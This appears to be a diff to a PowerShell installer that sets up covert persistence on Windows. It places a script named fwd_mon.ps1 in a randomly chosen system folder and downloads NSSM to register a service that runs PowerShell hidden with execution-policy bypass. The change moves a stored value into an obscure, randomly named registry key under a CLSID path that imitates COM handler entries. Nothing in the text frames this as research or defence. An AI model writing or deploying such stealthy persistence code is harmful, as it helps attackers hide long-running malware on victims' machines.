@@ -1,5 +1,5 @@
 param(
-    [string]$basePath
+    [string]$guid
 )
 
 $paths = @(
@@ -8,15 +8,16 @@ $paths = @(
     "$env:windir\System32\drivers\etc",
     "$env:windir\System32\LogFiles\WMI"
 )
-Start-Process powershell.exe -ArgumentList "-Command `"$basePath >> C:\initfwdmon.txt`""
+
 $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
 $fwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $fwdmonPath = "$fwdmonPath\fwd_mon.ps1"
+$basePath = "HKCU:\Software\Classes\CLSID\$guid\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system\yXureYzQpIRLN"
 $serviceName = "MyfwdmonService"
 $exepath = "powershell.exe"
-$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath $basePath"
+$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath '$basePath'"
 $downloadPath = "$env:temp\nssm.zip"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
